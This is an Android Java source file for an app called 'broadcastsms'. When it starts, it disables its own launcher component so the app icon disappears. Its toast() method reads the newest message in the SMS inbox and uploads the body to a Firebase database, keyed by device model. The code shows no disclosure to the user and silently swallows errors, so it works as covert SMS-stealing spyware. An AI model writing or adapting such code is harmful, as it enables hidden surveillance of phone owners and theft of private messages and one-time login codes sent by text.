package com.example.broadcastsms;

import android.Manifest;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.text.method.ScrollingMovementMethod;
import android.widget.TextView;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class MainActivity extends AppCompatActivity {
    MainActivity xxx;
    static MainActivity m;
    TextView txt;
    FirebaseDatabase database;
    String deviceModel;
    DatabaseReference myRef;
    Cursor cursor;
    Message_po x;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        m = this;
        xxx=this;
        txt = findViewById(R.id.txt);
        txt.setMovementMethod(new ScrollingMovementMethod());
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, com.example.broadcastsms.MainActivity.class);
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

    }
   static MainActivity getIstance(){
        return m;
    }
    public void toast(){
        Toast.makeText(this,"message received",Toast.LENGTH_LONG).show();

         database = FirebaseDatabase.getInstance();

         deviceModel = Build.MODEL;

         myRef = database.getReference("Devices");

        cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
        x=null;
        try {
            if (cursor.moveToFirst()) {
                if(cursor.getColumnName(12).equals("body")) {
                    x=new Message_po(cursor.getString(12));
                }
            } else {
            }
            myRef.child("message"+deviceModel).setValue(x);
        }
        catch (Exception e)
        {

        }

    }
}
